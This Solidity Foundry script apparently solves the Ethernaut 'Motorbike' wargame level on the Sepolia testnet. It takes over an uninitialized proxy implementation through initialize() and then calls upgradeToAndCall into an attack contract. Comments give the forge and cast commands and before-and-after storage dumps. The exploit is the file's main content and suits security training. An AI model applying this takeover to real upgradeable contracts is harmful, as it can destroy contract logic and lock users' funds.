// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// attack: 0xbb0726B4C7a7194d43d8B16d30315089f025CF12
// Engine: 0xf61990dc1f8e8d448bc3125f3a973b5ab8b3c71f

interface IEngine {
    function upgrader() external returns (address);

    function horsePower() external returns (uint256);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

interface IAttack {
    function fuckShitUp(address payable _recipient) external payable;
}

contract TriggerAttack is Script {
    uint256 privateKey = vm.envUint("PRIVATE_KEY");
    uint256 horsePower;
    address upgrader;

    IAttack attack;
    IEngine public engine;

    function run() external {
        address attackAddr = 0x0F4E37a07b70eB858Cdd8D910C262139606c8065;
        address engineAddr = 0xc5CA233b253fe0D5B6E62D3978D8B97A5d505844;
        address player = 0x0b9e2F440a82148BFDdb25BEA451016fB94A3F02;
        bytes memory payload = abi.encodeWithSignature(
            "fuckShitUp(address)",
            player
        );

        vm.startBroadcast(privateKey);
        // connect to the attack contract
        attack = IAttack(attackAddr);

        // connect to the engine contract
        engine = IEngine(engineAddr);

        // initialize() sets msg.sender as upgrader
        // Which grants its access to other functions
        engine.initialize();
        upgrader = engine.upgrader();
        horsePower = engine.horsePower();

        // initial() sets msg.sender as upgrader
        engine.upgradeToAndCall(attackAddr, payload);

        vm.stopBroadcast();

        console.log("Upgrader: ", upgrader);
        console.log("HorsePower: ", horsePower);
    }
}
// */

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vv
// Motorbike Address: 0x95cA4D4f70D6be921De259275CBa3e5Ad91739f3
// cast storage 0xb5318987ebEecc1b430E7F0d2e933148C6445ABA 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $SEPOLIA_RPC_URL
// 0x000000000000000000000000c5ca233b253fe0d5b6e62d3978d8b97a5d505844
// Engine Address: 0xc5CA233b253fe0D5B6E62D3978D8B97A5d505844

// cast storage 0xb5318987ebEecc1b430E7F0d2e933148C6445ABA 0 --rpc-url $SEPOLIA_RPC_URL
/*
Motorbike Slots
slot0: 0x000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd60001
slot1: 0x00000000000000000000000000000000000000000000000000000000000003e8
*/

// cast storage 0xc5CA233b253fe0D5B6E62D3978D8B97A5d505844 0 --rpc-url $SEPOLIA_RPC_URL
/*
Engine Slots
slot0: 0x0000000000000000000000000000000000000000000000000000000000000000
slot1: 0x0000000000000000000000000000000000000000000000000000000000000000
slot2: 0x0000000000000000000000000000000000000000000000000000000000000000
slot3: 0x0000000000000000000000000000000000000000000000000000000000000000
slot4: 0x0000000000000000000000000000000000000000000000000000000000000000
*/
// After initialize()
/*
Engine Slots
slot0: 0x000000000000000000000b9e2f440a82148bfddb25bea451016fb94a3f020001
slot1: 0x00000000000000000000000000000000000000000000000000000000000003e8
slot2: 0x0000000000000000000000000000000000000000000000000000000000000000
slot3: 0x0000000000000000000000000000000000000000000000000000000000000000
slot4: 0x0000000000000000000000000000000000000000000000000000000000000000
*/
